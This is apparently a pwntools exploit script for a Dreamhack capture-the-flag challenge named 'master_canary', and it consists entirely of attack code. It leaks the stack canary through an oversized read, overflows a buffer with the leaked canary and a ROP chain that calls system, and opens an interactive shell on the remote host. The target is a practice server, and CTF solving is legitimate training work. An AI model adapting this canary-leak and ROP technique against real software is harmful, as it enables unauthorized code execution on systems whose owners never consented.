from pwn import *

context.update(log_level= 'debug')
#p = process('master_canary')
elf = ELF('master_canary')
addr_plt_system = elf.plt['system']
p = remote('host1.dreamhack.games', 24115)

p.sendlineafter('> ', '1')
p.sendlineafter('> ', '2')

size = 0x8e8+1
p.recvrepeat(1)
p.sendline(str(size))

#raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)
p.send('a'*size)
p.recvuntil('Data: ')
canary = u64(p.recv(size+7)[-7:].rjust(8, '\x00'))
log.info('canary: ' + hex(canary))
addr_shell = 0x400A4A
addr_main = 0x400b05
p.sendlineafter('> ', '3')
p.recvrepeat(1)
p.sendline('a'*0x28 + p64(canary) + 'aaaaaaaa' + p64(0x400ce3) + p64(0x400d0d) + p64(0x400ce1) + p64(0)*2 + p64(addr_plt_system))
p.interactive()
